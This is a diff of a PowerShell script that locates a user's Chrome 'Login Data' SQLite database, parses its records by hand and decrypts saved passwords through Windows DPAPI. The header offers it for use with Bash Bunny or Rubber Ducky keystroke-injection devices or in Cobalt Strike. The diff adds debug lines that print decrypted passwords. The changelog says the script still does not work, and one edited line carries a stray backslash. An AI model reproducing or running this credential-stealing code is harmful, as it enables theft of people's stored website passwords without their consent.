@@ -4,9 +4,10 @@
 #  Date:    2017/04/28
 #
 #  Updated by: Patrick Hurd
-#  Date:       2020/03/11
+#  Date:       2020/03/11-12
 #  Version: 2.0
 #  Changelog:
+#   - 2.1: Move global scope to main function Get-ChromeCreds [Doesn't Work Still]
 #   - 2.0: Backport to Powershell 2.0 (Windows 7 default) [Doesn't Work Still]
 #   - 1.0: Initial version
 #
@@ -16,27 +17,14 @@
 #  entries in the 'logins' table.  It will only function when run by the
 #  user who owns the database being processed.  
 # 
-#  It is intended to be paired with a Bunny or Ducky script.  
+#  Can be paired with a Bunny or Ducky script, or used in Cobalt Strike when dpapi::chrome doesn't work.  
 ##
-
-# Use the default location in the current user's profile
-$User = $Env:USERPROFILE
-# TODO: Change "Default" to "Profile X" where X is the profile number
-$DbFile = "$User\AppData\Local\Google\Chrome\User Data\Default\Login Data"
-$Stream = New-Object IO.FileStream -ArgumentList "$DbFile", 'Open', 'Read', 'ReadWrite'
-
-Add-Type -AssemblyName System.Security
-$Encoding = [System.Text.Encoding]::GetEncoding(28591)
-$StreamReader = New-Object IO.StreamReader -ArgumentList $Stream, $Encoding
-$BinaryText = $StreamReader.ReadToEnd()
-
-$StreamReader.Close()
-$Stream.Close()
 
 ## 
 #  Length of various non-string field types in a record.  Derived from 
 #  https://www.sqlite.org/fileformat2.html#record_format
 ##
+# Backported from [ordered] hashtable to work on Powershell 2.0
 $SerialMap = @(0, 1, 2, 3, 4, 5, 6, 8, 0, 0)
 
 ##
@@ -58,10 +46,9 @@ Function ToInt($ByteArray)
     } While ($x -lt $ByteArray.Length)
 
     Return $Int
-    
-    #Return [bitconverter]::ToInt32($bytes,0)
 }
 
+# Copied from StackOverflow answer (and modified) to work on Powershell 2.0
 function bitshift {
     param(
         [Parameter(Mandatory=$True,Position=0)]
@@ -103,6 +90,7 @@ Function ParseVarint($ByteArray, [ref]$VarintSize)
 
         # Shift $Val left by 7 bits, then append the least significant 7 bits 
         # of the current byte.
+        # Backported from -shl to work on Powershell 2.0
         $val = bitshift $val -Left 7
         $Val = $Val -bor ($Byte -band 0x7F)
 
@@ -209,6 +197,7 @@ Function ParsePayload($Payload)
     For ($y = $Offset; $y -lt $HeaderLength; $y++)
     {
         $Serial = ParseVarint $Payload[$y .. ($y + 8)] $VarintSize
+        #write-output "Serial: $Serial"
         $y += $VarintSize.Value - 1
 
         Switch ($Serial)
@@ -234,14 +223,19 @@ Function ParsePayload($Payload)
     {
         $Str = $Encoding.GetString($Payload[$Offset .. ($Offset + $FieldSeq[$f] - 1)])
         If ($f -eq 0) { $URL = $Str }
-        ElseIf ($f -eq 3) { $Username = $Str }
-        ElseIf ($f -eq 5) { $Password = DecodePassword($Payload[$Offset .. ($Offset + $FieldSeq[$f] - 1)]) }
-        Write-Output $Password
+        ElseIf ($f -eq 3) {
+            $Username = $Str
+            #Write-Output "Username: $Username"
+        }
+        ElseIf ($f -eq 5) {
+            $Password = DecodePassword($Payload[$Offset .. ($Offset + $FieldSeq[$f] - 1)])\
+            Write-Output "Password: $Password"
+        }
         $Offset += $FieldSeq[$f]
     }
 
     # No record is printed if both the username and password are not present.
-    If ($Username.Length -gt 0 -and $Password.Length -gt 0) 
+    If ($Username.Length -gt 0)# -and $Password.Length -gt 0) 
     { 
         $PW = New-Object System.Object
         $PW | Add-Member -type NoteProperty -name URL -value $URL
@@ -260,37 +254,57 @@ Function ParsePayload($Payload)
 ##
 Function DecodePassword($Password)
 {
+    #Write-Output "Password: $Password"
     $P = $Encoding.GetBytes($Password)
+    Write-host "Password Bytes: $P"
+    #write-output "Password:" $P.Password
+    #write-host "P.Password: " + $P.Password
     Try
     {
         $Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Password,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+        #Write-Host "Decrypted: $Decrypt"
         Write-Output [System.Text.Encoding]::Default.GetString($Decrypt)
+        #write-host "Password: " + $P.Password
     }
-    Catch { Return "" }
+    Catch { write-host $_; Return "" }
 
 }
 
-#write-output $BinaryText[0 .. 5]
-#write-output @('S', 'Q', 'L', 'i', 't', 'e')
-
-# Verify the header; exit if $DbFile is not a SQLite database.
-If ((Compare-Object $BinaryText[0x0 .. 0x5] @('S', 'Q', 'L', 'i', 't', 'e')) -ne $null)
+Function Get-ChromeCreds()
 {
-    Break
-} Else {
-    Write-Output "Is an SQLite file"
+
+    # Use the default location in the current user's profile
+    $User = $Env:USERPROFILE
+    $DbFile = "$User\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+    $Stream = New-Object IO.FileStream -ArgumentList "$DbFile", 'Open', 'Read', 'ReadWrite'
+
+    Add-Type -AssemblyName System.Security
+    $Encoding = [System.Text.Encoding]::GetEncoding(28591)
+    $StreamReader = New-Object IO.StreamReader -ArgumentList $Stream, $Encoding
+    $BinaryText = $StreamReader.ReadToEnd()
+
+    $StreamReader.Close()
+    $Stream.Close()
+
+    # Verify the header; exit if $DbFile is not a SQLite database.
+    If ((Compare-Object $BinaryText[0x0 .. 0x5] @('S', 'Q', 'L', 'i', 't', 'e')) -ne $null)
+    {
+        Break
+    } Else {
+        Write-Output "Is an SQLite file"
+    }
+
+    # Grab the number of pages and page size out of the header
+    $NumPages = ToInt($BinaryText[0x1C .. 0x1F])
+    Write-Output $NumPages
+    $PageSize = ToInt($BinaryText[0x10 .. 0x11])
+    Write-Output $PageSize
+
+    # Start at Page 3 since Page 1 contains the sqlite_master table and Page 2 is a Ptrmap page 
+    For ($x = 0x2; $x -lt $NumPages; $x++)
+    {
+        $PageStart = ($x * $PageSize)
+        ParsePage $BinaryText[$PageStart .. ($PageStart + $PageSize - 1)]
+    }
+
 }
-
-# Grab the number of pages and page size out of the header
-$NumPages = ToInt($BinaryText[0x1C .. 0x1F])
-Write-Output $NumPages
-$PageSize = ToInt($BinaryText[0x10 .. 0x11])
-Write-Output $PageSize
-
-# Start at Page 3 since Page 1 contains the sqlite_master table and Page 2 is a Ptrmap page 
-For ($x = 0x2; $x -lt $NumPages; $x++)
-{
-    $PageStart = ($x * $PageSize)
-    ParsePage $BinaryText[$PageStart .. ($PageStart + $PageSize - 1)]
-}
-
